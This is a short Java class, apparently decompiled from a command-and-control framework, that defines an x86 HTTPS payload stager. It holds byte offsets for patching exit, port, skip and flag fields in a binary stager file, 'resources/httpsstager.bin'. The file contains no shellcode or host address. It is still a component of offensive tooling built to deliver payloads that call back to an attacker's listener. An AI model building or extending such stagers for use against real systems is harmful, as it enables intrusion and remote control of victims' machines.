package stagers;

import common.ScListener;

public abstract class GenericHTTPSStagerX86 extends GenericHTTPStager {
   public GenericHTTPSStagerX86(ScListener var1) {
      super(var1);
   }

   public int getExitOffset() {
      return 745;
   }

   public int getPortOffset() {
      return 196;
   }

   public int getSkipOffset() {
      return 773;
   }

   public int getFlagsOffset() {
      return 220;
   }

   public String arch() {
      return "x86";
   }

   public String getStagerFile() {
      return "resources/httpsstager.bin";
   }
}
